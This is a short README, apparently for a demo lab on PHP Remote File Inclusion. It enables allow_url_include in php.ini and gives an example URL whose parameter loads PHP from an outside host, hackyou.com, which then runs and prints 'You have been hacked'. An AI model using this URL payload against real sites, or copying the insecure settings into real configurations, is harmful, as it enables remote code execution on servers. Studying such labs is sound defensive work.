# Remote File Inclusion

## Usage

### Set php.ini

```
allow_url_fopen = On
allow_url_include = On
```

### Type Url in Browser

* http://hackme.com/rfi/index.php?event=event1&award=1

> gun

* http://hackme.com/rfi/index.php?event=http://hackyou.com/rfi/index

> You have been hacked


> it's execute http://hackyou.com/rfi/index.php

## Reference
* [The Web Application Security Consortium / Remote File Inclusion](http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion)

* [File inclusion vulnerability@wikipedia](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)